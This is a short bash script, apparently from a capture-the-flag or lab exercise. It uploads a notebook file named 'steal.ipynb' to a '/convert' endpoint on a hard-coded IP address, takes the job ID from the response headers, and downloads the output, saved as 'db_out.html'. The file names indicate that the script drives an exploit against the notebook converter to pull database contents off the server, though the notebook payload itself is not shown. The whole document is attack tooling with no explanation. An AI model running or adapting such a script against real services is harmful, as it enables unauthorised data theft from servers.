#!/bin/bash
TARGET="http://154.57.164.74:31330"

curl -s -X POST "$TARGET/convert" \
  -c /tmp/user_cookies.txt -b /tmp/user_cookies.txt \
  -F "notebook=@/tmp/steal.ipynb" \
  -F "format=html" \
  -D /tmp/headers.txt -o /dev/null

JOB_ID=$(grep -i 'location:' /tmp/headers.txt | grep -oP '/jobs/\K[0-9a-f]+')
echo "job: $JOB_ID"

curl -s "$TARGET/jobs/$JOB_ID/download" \
  -c /tmp/user_cookies.txt -b /tmp/user_cookies.txt \
  -o /tmp/db_out.html

echo "$(wc -c < /tmp/db_out.html) bytes -> /tmp/db_out.html"